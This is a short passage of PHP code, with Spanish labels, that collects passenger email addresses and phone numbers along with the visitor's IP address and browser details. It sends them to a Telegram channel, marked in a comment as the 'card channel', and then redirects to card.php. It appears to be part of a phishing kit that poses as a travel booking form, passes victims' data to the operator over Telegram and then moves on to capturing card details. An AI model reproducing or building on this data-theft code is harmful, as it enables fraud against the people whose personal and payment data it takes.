                $contenido .= "📧 Email: " . $pasajero['email'] . "\n";
                $contenido .= "📞 Teléfono: " . $pasajero['telefono'] . "\n";
                $contenido .= '━━━━━━━━━━━━━━━━━━━━' . "\n";
            }

            $contenido .= "\n🔧 INFORMACIÓN ADICIONAL\n";
            $contenido .= "📱 IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
            $contenido .= "💻 Dispositivo: " . $_SERVER['HTTP_USER_AGENT'] . "\n";

            // Enviar a Telegram (card channel por ahora)
            enviar_telegram($contenido, $owner, false, []);
        }

        $data['action'] = ['card.php', true];
        break;
}
echo json_encode($data);
